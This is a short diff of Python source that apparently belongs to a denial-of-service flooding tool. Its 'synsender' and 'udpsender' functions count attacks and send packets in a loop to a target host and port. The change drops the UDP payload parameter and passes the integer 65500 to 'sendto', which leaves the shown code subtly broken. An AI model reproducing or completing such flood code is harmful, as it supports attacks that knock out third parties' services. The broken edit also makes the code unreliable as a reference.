@@ -103,7 +103,7 @@ def synsender(host, port, timer, punch):
 	said -= 1
 	aid -= 1
 
-def udpsender(host, port, timer, punch):
+def udpsender(host, port, timer):
 	global uaid
 	global udp
 	global aid
@@ -116,7 +116,7 @@ def udpsender(host, port, timer, punch):
 	aid += 1
 	tattacks += 1
 	while time.time() < timeout and udp and attack:
-		sock.sendto(punch, (host, int(port)))
+		sock.sendto(65500, (host, int(port)))
 	uaid -= 1
 	aid -= 1
 
